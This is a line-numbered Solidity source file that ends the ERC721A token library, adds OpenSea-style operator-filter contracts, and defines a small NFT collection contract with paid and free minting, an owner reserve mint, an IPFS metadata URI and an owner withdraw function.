1027      * @dev Mints `quantity` tokens and transfers them to `to`.
1028      *
1029      * Requirements:
1030      *
1031      * - `to` cannot be the zero address.
1032      * - `quantity` must be greater than 0.
1033      *
1034      * Emits a {Transfer} event for each mint.
1035      */
1036     function _mint(address to, uint256 quantity) internal virtual {
1037         uint256 startTokenId = _currentIndex;
1038         if (quantity == 0) revert MintZeroQuantity();
1039 
1040         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1041 
1042         // Overflows are incredibly unrealistic.
1043         // `balance` and `numberMinted` have a maximum limit of 2**64.
1044         // `tokenId` has a maximum limit of 2**256.
1045         unchecked {
1046             // Updates:
1047             // - `balance += quantity`.
1048             // - `numberMinted += quantity`.
1049             //
1050             // We can directly add to the `balance` and `numberMinted`.
1051             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1052 
1053             // Updates:
1054             // - `address` to the owner.
1055             // - `startTimestamp` to the timestamp of minting.
1056             // - `burned` to `false`.
1057             // - `nextInitialized` to `quantity == 1`.
1058             _packedOwnerships[startTokenId] = _packOwnershipData(
1059                 to,
1060                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1061             );
1062 
1063             uint256 toMasked;
1064             uint256 end = startTokenId + quantity;
1065 
1066             // Use assembly to loop and emit the `Transfer` event for gas savings.
1067             // The duplicated `log4` removes an extra check and reduces stack juggling.
1068             // The assembly, together with the surrounding Solidity code, have been
1069             // delicately arranged to nudge the compiler into producing optimized opcodes.
1070             assembly {
1071                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1072                 toMasked := and(to, _BITMASK_ADDRESS)
1073                 // Emit the `Transfer` event.
1074                 log4(
1075                     0, // Start of data (0, since no data).
1076                     0, // End of data (0, since no data).
1077                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1078                     0, // `address(0)`.
1079                     toMasked, // `to`.
1080                     startTokenId // `tokenId`.
1081                 )
1082 
1083                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1084                 // that overflows uint256 will make the loop run out of gas.
1085                 // The compiler will optimize the `iszero` away for performance.
1086                 for {
1087                     let tokenId := add(startTokenId, 1)
1088                 } iszero(eq(tokenId, end)) {
1089                     tokenId := add(tokenId, 1)
1090                 } {
1091                     // Emit the `Transfer` event. Similar to above.
1092                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1093                 }
1094             }
1095             if (toMasked == 0) revert MintToZeroAddress();
1096 
1097             _currentIndex = end;
1098         }
1099         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1100     }
1101 
1102     /**
1103      * @dev Mints `quantity` tokens and transfers them to `to`.
1104      *
1105      * This function is intended for efficient minting only during contract creation.
1106      *
1107      * It emits only one {ConsecutiveTransfer} as defined in
1108      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1109      * instead of a sequence of {Transfer} event(s).
1110      *
1111      * Calling this function outside of contract creation WILL make your contract
1112      * non-compliant with the ERC721 standard.
1113      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1114      * {ConsecutiveTransfer} event is only permissible during contract creation.
1115      *
1116      * Requirements:
1117      *
1118      * - `to` cannot be the zero address.
1119      * - `quantity` must be greater than 0.
1120      *
1121      * Emits a {ConsecutiveTransfer} event.
1122      */
1123     function _mintERC2309(address to, uint256 quantity) internal virtual {
1124         uint256 startTokenId = _currentIndex;
1125         if (to == address(0)) revert MintToZeroAddress();
1126         if (quantity == 0) revert MintZeroQuantity();
1127         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1128 
1129         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1130 
1131         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1132         unchecked {
1133             // Updates:
1134             // - `balance += quantity`.
1135             // - `numberMinted += quantity`.
1136             //
1137             // We can directly add to the `balance` and `numberMinted`.
1138             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1139 
1140             // Updates:
1141             // - `address` to the owner.
1142             // - `startTimestamp` to the timestamp of minting.
1143             // - `burned` to `false`.
1144             // - `nextInitialized` to `quantity == 1`.
1145             _packedOwnerships[startTokenId] = _packOwnershipData(
1146                 to,
1147                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1148             );
1149 
1150             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1151 
1152             _currentIndex = startTokenId + quantity;
1153         }
1154         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1155     }
1156 
1157     /**
1158      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1159      *
1160      * Requirements:
1161      *
1162      * - If `to` refers to a smart contract, it must implement
1163      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1164      * - `quantity` must be greater than 0.
1165      *
1166      * See {_mint}.
1167      *
1168      * Emits a {Transfer} event for each mint.
1169      */
1170     function _safeMint(
1171         address to,
1172         uint256 quantity,
1173         bytes memory _data
1174     ) internal virtual {
1175         _mint(to, quantity);
1176 
1177         unchecked {
1178             if (to.code.length != 0) {
1179                 uint256 end = _currentIndex;
1180                 uint256 index = end - quantity;
1181                 do {
1182                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1183                         revert TransferToNonERC721ReceiverImplementer();
1184                     }
1185                 } while (index < end);
1186                 // Reentrancy protection.
1187                 if (_currentIndex != end) revert();
1188             }
1189         }
1190     }
1191 
1192     /**
1193      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1194      */
1195     function _safeMint(address to, uint256 quantity) internal virtual {
1196         _safeMint(to, quantity, '');
1197     }
1198 
1199     // =============================================================
1200     //                        BURN OPERATIONS
1201     // =============================================================
1202 
1203     /**
1204      * @dev Equivalent to `_burn(tokenId, false)`.
1205      */
1206     function _burn(uint256 tokenId) internal virtual {
1207         _burn(tokenId, false);
1208     }
1209 
1210     /**
1211      * @dev Destroys `tokenId`.
1212      * The approval is cleared when the token is burned.
1213      *
1214      * Requirements:
1215      *
1216      * - `tokenId` must exist.
1217      *
1218      * Emits a {Transfer} event.
1219      */
1220     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1221         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1222 
1223         address from = address(uint160(prevOwnershipPacked));
1224 
1225         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1226 
1227         if (approvalCheck) {
1228             // The nested ifs save around 20+ gas over a compound boolean condition.
1229             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1230                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1231         }
1232 
1233         _beforeTokenTransfers(from, address(0), tokenId, 1);
1234 
1235         // Clear approvals from the previous owner.
1236         assembly {
1237             if approvedAddress {
1238                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1239                 sstore(approvedAddressSlot, 0)
1240             }
1241         }
1242 
1243         // Underflow of the sender's balance is impossible because we check for
1244         // ownership above and the recipient's balance can't realistically overflow.
1245         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1246         unchecked {
1247             // Updates:
1248             // - `balance -= 1`.
1249             // - `numberBurned += 1`.
1250             //
1251             // We can directly decrement the balance, and increment the number burned.
1252             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1253             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1254 
1255             // Updates:
1256             // - `address` to the last owner.
1257             // - `startTimestamp` to the timestamp of burning.
1258             // - `burned` to `true`.
1259             // - `nextInitialized` to `true`.
1260             _packedOwnerships[tokenId] = _packOwnershipData(
1261                 from,
1262                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1263             );
1264 
1265             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1266             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1267                 uint256 nextTokenId = tokenId + 1;
1268                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1269                 if (_packedOwnerships[nextTokenId] == 0) {
1270                     // If the next slot is within bounds.
1271                     if (nextTokenId != _currentIndex) {
1272                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1273                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1274                     }
1275                 }
1276             }
1277         }
1278 
1279         emit Transfer(from, address(0), tokenId);
1280         _afterTokenTransfers(from, address(0), tokenId, 1);
1281 
1282         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1283         unchecked {
1284             _burnCounter++;
1285         }
1286     }
1287 
1288     // =============================================================
1289     //                     EXTRA DATA OPERATIONS
1290     // =============================================================
1291 
1292     /**
1293      * @dev Directly sets the extra data for the ownership data `index`.
1294      */
1295     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1296         uint256 packed = _packedOwnerships[index];
1297         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1298         uint256 extraDataCasted;
1299         // Cast `extraData` with assembly to avoid redundant masking.
1300         assembly {
1301             extraDataCasted := extraData
1302         }
1303         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1304         _packedOwnerships[index] = packed;
1305     }
1306 
1307     /**
1308      * @dev Called during each token transfer to set the 24bit `extraData` field.
1309      * Intended to be overridden by the cosumer contract.
1310      *
1311      * `previousExtraData` - the value of `extraData` before transfer.
1312      *
1313      * Calling conditions:
1314      *
1315      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1316      * transferred to `to`.
1317      * - When `from` is zero, `tokenId` will be minted for `to`.
1318      * - When `to` is zero, `tokenId` will be burned by `from`.
1319      * - `from` and `to` are never both zero.
1320      */
1321     function _extraData(
1322         address from,
1323         address to,
1324         uint24 previousExtraData
1325     ) internal view virtual returns (uint24) {}
1326 
1327     /**
1328      * @dev Returns the next extra data for the packed ownership data.
1329      * The returned result is shifted into position.
1330      */
1331     function _nextExtraData(
1332         address from,
1333         address to,
1334         uint256 prevOwnershipPacked
1335     ) private view returns (uint256) {
1336         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1337         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1338     }
1339 
1340     // =============================================================
1341     //                       OTHER OPERATIONS
1342     // =============================================================
1343 
1344     /**
1345      * @dev Returns the message sender (defaults to `msg.sender`).
1346      *
1347      * If you are writing GSN compatible contracts, you need to override this function.
1348      */
1349     function _msgSenderERC721A() internal view virtual returns (address) {
1350         return msg.sender;
1351     }
1352 
1353     /**
1354      * @dev Converts a uint256 to its ASCII string decimal representation.
1355      */
1356     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1357         assembly {
1358             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1359             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1360             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1361             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1362             let m := add(mload(0x40), 0xa0)
1363             // Update the free memory pointer to allocate.
1364             mstore(0x40, m)
1365             // Assign the `str` to the end.
1366             str := sub(m, 0x20)
1367             // Zeroize the slot after the string.
1368             mstore(str, 0)
1369 
1370             // Cache the end of the memory to calculate the length later.
1371             let end := str
1372 
1373             // We write the string from rightmost digit to leftmost digit.
1374             // The following is essentially a do-while loop that also handles the zero case.
1375             // prettier-ignore
1376             for { let temp := value } 1 {} {
1377                 str := sub(str, 1)
1378                 // Write the character to the pointer.
1379                 // The ASCII index of the '0' character is 48.
1380                 mstore8(str, add(48, mod(temp, 10)))
1381                 // Keep dividing `temp` until zero.
1382                 temp := div(temp, 10)
1383                 // prettier-ignore
1384                 if iszero(temp) { break }
1385             }
1386 
1387             let length := sub(end, str)
1388             // Move the pointer 32 bytes leftwards to make room for the length.
1389             str := sub(str, 0x20)
1390             // Store the length.
1391             mstore(str, length)
1392         }
1393     }
1394 }
1395 
1396 
1397 interface IOperatorFilterRegistry {
1398     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1399     function register(address registrant) external;
1400     function registerAndSubscribe(address registrant, address subscription) external;
1401     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1402     function unregister(address addr) external;
1403     function updateOperator(address registrant, address operator, bool filtered) external;
1404     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1405     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1406     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1407     function subscribe(address registrant, address registrantToSubscribe) external;
1408     function unsubscribe(address registrant, bool copyExistingEntries) external;
1409     function subscriptionOf(address addr) external returns (address registrant);
1410     function subscribers(address registrant) external returns (address[] memory);
1411     function subscriberAt(address registrant, uint256 index) external returns (address);
1412     function copyEntriesOf(address registrant, address registrantToCopy) external;
1413     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1414     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1415     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1416     function filteredOperators(address addr) external returns (address[] memory);
1417     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1418     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1419     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1420     function isRegistered(address addr) external returns (bool);
1421     function codeHashOf(address addr) external returns (bytes32);
1422 }
1423 
1424 
1425 /**
1426  * @title  OperatorFilterer
1427  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1428  *         registrant's entries in the OperatorFilterRegistry.
1429  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1430  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1431  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1432  */
1433 abstract contract OperatorFilterer {
1434     error OperatorNotAllowed(address operator);
1435 
1436     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1437         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1438 
1439     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1440         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1441         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1442         // order for the modifier to filter addresses.
1443         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1444             if (subscribe) {
1445                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1446             } else {
1447                 if (subscriptionOrRegistrantToCopy != address(0)) {
1448                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1449                 } else {
1450                     OPERATOR_FILTER_REGISTRY.register(address(this));
1451                 }
1452             }
1453         }
1454     }
1455 
1456     modifier onlyAllowedOperator(address from) virtual {
1457         // Check registry code length to facilitate testing in environments without a deployed registry.
1458         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1459             // Allow spending tokens from addresses with balance
1460             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1461             // from an EOA.
1462             if (from == msg.sender) {
1463                 _;
1464                 return;
1465             }
1466             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1467                 revert OperatorNotAllowed(msg.sender);
1468             }
1469         }
1470         _;
1471     }
1472 
1473     modifier onlyAllowedOperatorApproval(address operator) virtual {
1474         // Check registry code length to facilitate testing in environments without a deployed registry.
1475         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1476             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1477                 revert OperatorNotAllowed(operator);
1478             }
1479         }
1480         _;
1481     }
1482 }
1483 
1484 /**
1485  * @title  DefaultOperatorFilterer
1486  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1487  */
1488 abstract contract TheOperatorFilterer is OperatorFilterer {
1489     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1490 
1491     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1492 }
1493 
1494 
1495 contract ExpressionsbySPDZQ is ERC721A, TheOperatorFilterer {
1496     //baseURI
1497     string public baseURI;
1498 
1499     //uriSuffix
1500     string public uriSuffix;
1501 
1502     // owner
1503     address public owner;
1504 
1505     // maxSupply
1506     uint256 public maxSupply = 2000;
1507 
1508     // mint price
1509     uint256 public price = 0.0012 ether;
1510 
1511     // entry per addr
1512     uint256 public maxFreePerAddr = 2;
1513 
1514     mapping(address => uint256) _numForFree;
1515     mapping(uint256 => uint256) _numMinted;
1516 
1517 
1518     uint256 private maxPerTx;
1519 
1520 
1521     function mint(uint256 amount) payable public {
1522         require(totalSupply() + amount <= maxSupply);
1523         if (msg.value == 0) {
1524             require(amount == 1 && _numMinted[block.number] < getFreeNum() && _numForFree[tx.origin] < maxFreePerAddr );
1525             _numForFree[tx.origin]++;
1526             _numMinted[block.number]++;
1527             _safeMint(msg.sender, 1);
1528         } else {
1529             require(amount <= maxPerTx);
1530             require(msg.value >= amount * price);
1531             _safeMint(msg.sender, amount);
1532         }
1533     }
1534 
1535     function reseve(address rec, uint256 amount) public onlyOwner {
1536         _safeMint(rec, amount);
1537     }
1538     
1539     modifier onlyOwner {
1540         require(owner == msg.sender);
1541         _;
1542     }
1543 
1544     constructor() ERC721A("Expressions by SPDZQ", "SPDZQ") {
1545         owner = msg.sender;
1546         maxPerTx = 20;
1547     }
1548 
1549     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1550         return string(abi.encodePacked("ipfs://bafybeihbp2zux7jm3v3aaqii7ld55zaudk4lhbmgl6q276f5vk32pt3cyq/", _toString(tokenId), ".json"));
1551     }
1552 
1553     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1554         maxFreePerAddr = maxTx;
1555     }
1556 
1557     function getFreeNum() internal returns (uint256){
1558         return (maxSupply - totalSupply()) / 12;
1559     }
1560 
1561     function withdraw() external onlyOwner {
1562         payable(msg.sender).transfer(address(this).balance);
1563     }
1564 
1565     /////////////////////////////
1566     // OPENSEA FILTER REGISTRY 
1567     /////////////////////////////
1568 
1569     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1570         super.setApprovalForAll(operator, approved);
1571     }
1572 
1573     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1574         super.approve(operator, tokenId);
1575     }
1576 
1577     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1578         super.transferFrom(from, to, tokenId);
1579     }
1580 
1581     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1582         super.safeTransferFrom(from, to, tokenId);
1583     }
1584 
1585     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1586         public
1587         payable
1588         override
1589         onlyAllowedOperator(from)
1590     {
1591         super.safeTransferFrom(from, to, tokenId, data);
1592     }
1593 }